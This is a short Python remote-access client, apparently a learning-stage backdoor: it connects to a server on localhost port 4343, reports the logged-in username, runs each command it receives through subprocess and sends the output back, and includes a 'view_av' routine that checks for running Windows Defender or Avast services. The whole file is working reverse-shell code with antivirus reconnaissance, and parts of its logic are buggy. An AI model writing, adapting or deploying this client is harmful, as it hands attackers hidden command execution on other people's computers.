import os
import socket
import subprocess

#c = wmi.WMI(computer='localmachine')

def PredefinedCommands(cmd):
    result = ''
    if 'view_av' in cmd:
        command = subprocess.run('net start', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 universal_newlines=True)
        error = command.stderr
        if error != '':
            command = command.stdout
            if 'Windows Defender' in command:
                result = "Windows Defender"
            if 'Avast Antivirus' in command:
                if result != '':
                    result = f"{result} | Avast Antivirus"
                else:
                    result = "Avast Antivirus"
            if result == '':
                result = "No Antivirus Running"
        else:
            result = error
    return result

def Cmd_Execute(command):
    list_cmd = ['view_av']

    try:
        if command in list_cmd:
            cmd = PredefinedCommands(command)
        else:
            command = command.split(' ')
            if len(command) == 1:
                cmd = subprocess.run([command[0]], shell=True, stdout=subprocess.PIPE, universal_newlines=True)
            elif len(command) == 2:
                cmd = subprocess.run([command[0], command[1]], stdout=subprocess.PIPE, universal_newlines=True)
            elif len(command) == 3:
                cmd = subprocess.run([command[0], command[1], command[2]], stdout=subprocess.PIPE, universal_newlines=True)
            elif len(command) == 4:
                cmd = subprocess.run([command[0], command[1]], stdout=subprocess.PIPE, universal_newlines=True)
            cmd = cmd.stdout
    except Exception as e:
        cmd = e

    finally:
        return cmd


host = 'localhost'
port = 4343
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.sendall(os.getlogin().encode())
while True:
    try:
        data_recv = s.recv(1024).decode()
        if data_recv != '':
            data = Cmd_Execute(data_recv)
        else:
            data = "Ingresar Commando"
        s.sendall(data.encode())
    except Exception as e:
        print(e)

